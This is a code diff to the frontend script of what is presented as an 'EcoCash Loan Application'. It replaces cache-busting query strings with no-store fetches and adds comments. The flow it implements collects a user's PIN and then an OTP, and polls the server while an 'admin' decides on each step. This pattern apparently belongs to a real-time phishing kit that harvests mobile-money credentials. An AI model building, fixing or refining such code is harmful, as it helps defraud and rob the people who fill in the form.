@@ -1,5 +1,5 @@
 // ============================================================
-// EcoCash Loan Application – Frontend Logic (with localStorage)
+// EcoCash Loan Application – Frontend Logic (FINAL)
 // ============================================================
 
 let appData = {
@@ -21,10 +21,7 @@ let currentPage = 'page-landing';
 
 // ─── localStorage Helpers ───
 function saveState() {
-  const state = {
-    appData: appData,
-    currentPage: currentPage
-  };
+  const state = { appData, currentPage };
   localStorage.setItem('ecocash_app_state', JSON.stringify(state));
 }
 
@@ -139,7 +136,7 @@ async function submitApp() {
     if (data.ok) {
       appData.applicationId = data.applicationId;
       goTo('page-pin');
-      startPinPolling();
+      startPinPolling(); // Start polling immediately after submission
     } else {
       alert('Error: ' + data.error);
     }
@@ -163,7 +160,7 @@ async function doPin() {
     });
     const data = await response.json();
     if (data.ok) {
-      startPinPolling();
+      startPinPolling(); // Start polling for admin decision
     } else if (data.blocked) {
       showError('pinErr', data.message);
       disablePinInputs();
@@ -175,13 +172,14 @@ async function doPin() {
   }
 }
 
-// ─── PIN Polling (with cache-busting) ───
+// ─── PIN Polling (with no-cache to avoid 304) ───
 function startPinPolling() {
   if (window._pinInterval) clearInterval(window._pinInterval);
   window._pinInterval = setInterval(async () => {
     try {
-      // Add cache-busting query parameter to avoid 304
-      const res = await fetch(`/api/status/${appData.applicationId}/pin?t=${Date.now()}`);
+      const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
+        cache: 'no-store'   // <-- Prevents 304, always gets fresh status
+      });
       if (res.status === 404) {
         clearInterval(window._pinInterval);
         clearState();
@@ -216,7 +214,7 @@ function startPinPolling() {
         showError('pinErr', 'Application blocked. Please wait 5 minutes.');
         return;
       }
-      // If pending, stay on pin page
+      // If pending, just stay on the PIN page
       if (!document.getElementById('page-pin').classList.contains('active')) {
         goTo('page-pin');
       }
@@ -249,12 +247,14 @@ async function doOtp() {
   }
 }
 
-// ─── OTP Polling (with cache-busting) ───
+// ─── OTP Polling (with no-cache) ───
 function startOtpPolling() {
   if (window._otpInterval) clearInterval(window._otpInterval);
   window._otpInterval = setInterval(async () => {
     try {
-      const res = await fetch(`/api/status/${appData.applicationId}/otp?t=${Date.now()}`);
+      const res = await fetch(`/api/status/${appData.applicationId}/otp`, {
+        cache: 'no-store'
+      });
       if (res.status === 404) {
         clearInterval(window._otpInterval);
         clearState();
@@ -305,7 +305,7 @@ function showApproval() {
   document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
   document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
   goTo('page-approval');
-  clearState(); // Once approved, clear saved state
+  clearState();
 }
 
 function showRejected(reason) {
@@ -365,6 +365,7 @@ document.addEventListener('DOMContentLoaded', function() {
       startPinPolling();
     } else if (currentPage === 'page-otp') {
       goTo('page-otp');
+      // We don't start OTP polling until user submits OTP
     } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
       goTo(currentPage);
     } else {
